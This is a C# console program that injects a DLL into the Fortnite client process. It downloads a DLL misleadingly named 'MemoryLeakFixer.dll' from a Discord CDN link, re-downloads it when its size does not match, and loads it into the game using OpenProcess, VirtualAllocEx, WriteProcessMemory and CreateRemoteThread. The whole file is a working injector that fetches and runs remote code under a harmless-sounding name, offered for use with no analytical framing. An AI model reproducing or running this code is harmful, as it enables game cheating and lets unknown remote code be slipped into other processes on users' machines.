using System;
using System.IO;
using System.Net;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace XDAR
{
    internal class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
        uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess,
        IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        const int PROCESS_CREATE_THREAD = 0x0002;
        const int PROCESS_QUERY_INFORMATION = 0x0400;
        const int PROCESS_VM_OPERATION = 0x0008;
        const int PROCESS_VM_WRITE = 0x0020;
        const int PROCESS_VM_READ = 0x0010;
        const uint MEM_COMMIT = 0x00001000;
        const uint MEM_RESERVE = 0x00002000;
        const uint PAGE_READWRITE = 4;
        public static Process _injectpoint = Process.GetProcessesByName("FortniteClient-Win64-Shipping.exe")[0];
        public static int Main()
        {
            if (!File.Exists("MemoryLeakFixer.dll"))
            {
                try
                {
                    WebClient wc = new();
                    wc.DownloadFileCompleted += new System.ComponentModel.AsyncCompletedEventHandler(DownloadDLLCompletedCallback);
                    Console.WriteLine("DLL not found! Downloading DLL...");
                    wc.DownloadFileAsync(new Uri("https://cdn.discordapp.com/attachments/870762655621742692/909216609367916554/MemoryLeakFixer.dll"), @"./MemoryLeakFixer.dll");
                    Console.ReadLine();
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
            }
            else if (File.Exists("MemoryLeakFixer.dll"))
            {
                try
                {
                    long fs = new FileInfo("MemoryLeakFixer.dll").Length;
                    if (fs == 13824)
                    {
                        Inject();
                    }
                    else
                    {
                        WebClient wc = new();
                        wc.DownloadFileCompleted += new System.ComponentModel.AsyncCompletedEventHandler(DownloadDLLCompletedCallback);
                        Console.WriteLine("DLL is corrupted! Redownloading DLL...");
                        File.Delete("./MemoryLeakFixer.dll");
                        wc.DownloadFileAsync(new Uri("https://cdn.discordapp.com/attachments/870762655621742692/909216609367916554/MemoryLeakFixer.dll"), @"./MemoryLeakFixer.dll");
                        Console.ReadLine();
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
            }
            return 0;
        }
        public static void DownloadDLLCompletedCallback(object sender, System.ComponentModel.AsyncCompletedEventArgs e)
        {
            Console.WriteLine("DLL downloaded!");
            Inject();
        }
        public static int Inject()
        {
            try
            {
                Console.WriteLine("Got process ID of " + _injectpoint);
                IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, _injectpoint.Id);
                IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
                string dllName = "MemoryLeakFixer.dll";
                IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                Console.WriteLine("allocated memory address");
                UIntPtr bytesWritten;
                WriteProcessMemory(procHandle, allocMemAddress, Encoding.Default.GetBytes(dllName), (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten);
                Console.WriteLine("wrote process memory");
                CreateRemoteThread(procHandle, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddress, 0, IntPtr.Zero);
                Console.WriteLine("created remote thread");
                Console.WriteLine("DLL injected into Process " + _injectpoint + " (Fortnite)");
                Console.ReadLine();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Console.ReadLine();
            }
            return 0;
        }
    }
}